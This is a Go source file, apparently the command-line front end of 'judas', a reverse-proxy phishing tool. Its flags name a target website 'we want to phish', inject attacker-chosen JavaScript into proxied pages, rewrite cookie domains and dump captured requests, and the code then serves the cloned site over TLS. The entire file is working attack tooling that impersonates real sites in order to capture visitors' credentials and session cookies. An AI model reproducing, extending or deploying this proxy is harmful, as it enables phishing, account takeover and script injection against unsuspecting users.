package main

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"errors"
	"flag"
	"fmt"
	"github.com/becivells/judas"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	_ "net/http/pprof"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
)

var (
	Version        = "unknown"
	Commit         = "unknown"
	Date           = "unknown"
	Branch         = "unknown"
	jsContent      []byte
	sv             = flag.Bool("v", false, "show version")
	targetURL      = flag.String("target", "", "The website we want to phish.")
	address        = flag.String("address", "localhost:8080", "Address and port to run proxy service on. Format address:port.")
	attachProfiler = flag.Bool("with-profiler", false, "Attach profiler to instance.")
	proxyURL       = flag.String("proxy", "", "Optional upstream proxy. Useful for torification or debugging. Supports HTTPS and SOCKS5 based on the URL. For example, http://localhost:8080 or socks5://localhost:9150.")
	javascriptURL  = flag.String("inject-js", "", "URL or file to a JavaScript file you want injected.")
	insecure       = flag.Bool("insecure", false, "Listen without TLS.")
	sourceInsecure = flag.Bool("insecure-target", false, "Not verify SSL certificate from target host.")
	proxyCACert    = flag.String("proxy-ca-cert", "", "Proxy CA cert for signed requests")
	proxyCAKey     = flag.String("proxy-ca-key", "", "Proxy CA key for signed requests")
	sslHostname    = flag.String("ssl-hostname", "", "Hostname for SSL certificate")
	pluginPaths    = flag.String("plugins", "", "Colon separated file path to plugin binaries.")
	cookiesDomain  = flag.String("cookie-domain", "", "set Cookies Domain")
	cookieHttpOnly = flag.Bool("cookie-httponly", true, "set Cookies httponly ")
	injectURL      = flag.String("inject-url", "*", "target URL to a JavaScript file you want injected. default * is all ',' split")
	dumpURL        = flag.String("dump-url", "*", "dump request URL * is no dump")
)

func showVersion() {
	fmt.Printf("Current Version: %s\n", Version)
	fmt.Printf("Current branch: %s\n", Branch)
	fmt.Printf("Current commit: %s\n", Commit)
	fmt.Printf("Current date: %s\n", Date)
	os.Exit(0)
}
func exitWithError(message string) {
	log.Println(message)
	os.Exit(-1)
}

func FileExist(path string) bool {
	_, err := os.Lstat(path)
	if err != nil {
		fmt.Println(err.Error())
	}
	return !os.IsNotExist(err)
}

func setupRequiredFlags() {
	flag.Parse()
	if *sv {
		showVersion()
	}
	if *address == "" {
		exitWithError("--address is required.")
	}

	if *targetURL == "" {
		exitWithError("--target is required.")
	}

	if !*insecure && *sslHostname == "" {
		exitWithError("--ssl-hostname is required unless --insecure flag is enabled.")
	}
}

func getReverse(ReverseAddress string) (*judas.ReverseConfig, error) {
	revSplit := strings.Split(ReverseAddress, ":")

	if len(revSplit) == 2 {
		port, err := strconv.Atoi(revSplit[1])
		if err != nil {
			return nil, err
		}
		return &judas.ReverseConfig{
			Address:        strings.Trim(revSplit[0], " "),
			Port:           port,
			CookieDomain:   *cookiesDomain,
			InjectURLs:     strings.Split(*injectURL, ","),
			DumpURL:        strings.Split(*dumpURL, ","),
			CookieHttpOnly: *cookieHttpOnly,
		}, nil
	}
	return nil, errors.New("不支持ipv6")
}

// RandChar random char
func RandChar(size int) string {
	char := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	rand.Seed(time.Now().UnixNano()) // 产生随机种子
	var s bytes.Buffer
	for i := 0; i < size; i++ {
		s.WriteByte(char[rand.Int63()%int64(len(char))])
	}
	return s.String()
}
func main() {
	setupRequiredFlags()

	if *cookiesDomain != "" {
		log.Printf("Use reverse domain %s\n", *cookiesDomain)
	}

	if *javascriptURL != "" {
		jsURL := strings.Trim(*javascriptURL, " ")
		if strings.HasPrefix(jsURL, "http") || strings.HasPrefix(jsURL, "https") {
			log.Printf("use inject js form url: %s \n", jsURL)
		} else if FileExist(jsURL) {
			*javascriptURL = fmt.Sprintf("/%s.js", RandChar(8))
			log.Printf("use inject js form file: %s URL: %s\n", jsURL, *javascriptURL)

			b, err := ioutil.ReadFile(jsURL) // just pass the file name
			if err != nil {
				fmt.Print(err)
			}
			jsContent = b

		} else {
			log.Printf("uinject js : %s  error\n", jsURL)
			os.Exit(1)
		}
	}

	ReverseAddress, err := getReverse(*address)
	if err != nil {
		panic(err)
	}
	log.Println("Setting target to", *targetURL)
	u, err := url.Parse(*targetURL)
	if err != nil {
		exitWithError(err.Error())
	}

	logger := log.New(os.Stdout, "judas: ", log.Ldate|log.Ltime|log.Llongfile)

	rootCAs, _ := x509.SystemCertPool()
	if rootCAs == nil {
		rootCAs = x509.NewCertPool()
	}
	if *proxyCACert != "" {
		proxyCACertFile, err := os.Open(*proxyCACert)
		if err != nil {
			logger.Fatal(err)
		}
		defer proxyCACertFile.Close()

		certs, err := ioutil.ReadAll(proxyCACertFile)
		if err != nil {
			logger.Fatal(err)
		}

		if ok := rootCAs.AppendCertsFromPEM(certs); !ok {
			logger.Fatalf("failed to trust custom CA certs from %s", *proxyCACert)
		}
	}

	var httpTransport http.RoundTripper = &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: *insecure,
			RootCAs:            rootCAs,
		},
		DialContext: (&net.Dialer{
			Timeout:   60 * time.Second, //连接超时
			KeepAlive: 30 * time.Second, //长连接超时时间
		}).DialContext,
		MaxIdleConns:          100,               //最大空闲连接
		IdleConnTimeout:       120 * time.Second, //空闲超时时间
		TLSHandshakeTimeout:   10 * time.Second,  //tls握手超时时间
		ExpectContinueTimeout: 1 * time.Second,   //100-continue 超时时间
	}

	if *proxyURL != "" {
		proxy, err := url.Parse(*proxyURL)
		if err != nil {
			logger.Fatal(err)
		}

		httpTransport.(*http.Transport).Proxy = http.ProxyURL(proxy)
	}

	transport := &judas.InterceptingTransport{
		RoundTripper: httpTransport,
		TargetURL:    u,
	}

	if *pluginPaths != "" {
		pluginFilePaths := strings.Split(*pluginPaths, ":")
		plugins, err := judas.LoadPlugins(logger, pluginFilePaths)
		if err != nil {
			exitWithError(err.Error())
		}

		transport.Plugins = plugins
	}

	config := &judas.Config{
		TargetURL:     u,
		Reverse:       ReverseAddress,
		Logger:        logger,
		Transport:     transport,
		JavascriptURL: *javascriptURL,
	}
	phishingProxy := judas.New(config)

	if *attachProfiler {
		go func() {
			log.Println("Starting profiler.")
			log.Println(http.ListenAndServe("localhost:6060", nil))
		}()
	}

	if err != nil {
		exitWithError(err.Error())
	}

	if jsContent != nil {
		http.HandleFunc(*javascriptURL, func(w http.ResponseWriter, request *http.Request) {
			w.Write(jsContent)
			w.Header().Set("Content-Type", "application/javascript")
		})
	}

	http.HandleFunc("/", phishingProxy.HandleRequests)

	if *insecure {
		listenAddr := fmt.Sprintf("http://%s", *address)
		log.Println("Listening on:", listenAddr)
		err = http.ListenAndServe(*address, nil)
		if err != nil {
			log.Println(err)
		}
	} else {
		listenAddr := fmt.Sprintf("https://%s", *address)
		log.Println("Listening on:", listenAddr)
		err = http.ListenAndServeTLS(*address, *proxyCACert, *proxyCAKey, nil)
		if err != nil {
			log.Println(err)
		}
	}
}
